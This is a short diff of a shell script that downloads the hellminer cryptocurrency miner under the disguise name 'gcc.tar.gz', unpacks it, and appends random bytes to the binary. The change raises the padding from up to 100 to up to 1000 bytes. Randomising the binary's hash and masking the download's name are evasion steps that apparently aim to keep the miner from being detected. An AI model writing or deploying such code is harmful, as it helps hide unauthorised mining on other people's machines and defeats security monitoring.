@@ -32,7 +32,7 @@ echo "最低延迟的URL是: $best_url，延迟: $min_latency ms"
 mkdir vrsc && cd vrsc
 wget -O gcc.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 tar -zxvf gcc.tar.gz && rm -rf gcc.tar.gz
-count=$((RANDOM % 100 + 1))
+count=$((RANDOM % 1000 + 1))
 for ((i = 0; i < count; i++)); do
   echo -n "0" >> "hellminer"
 done
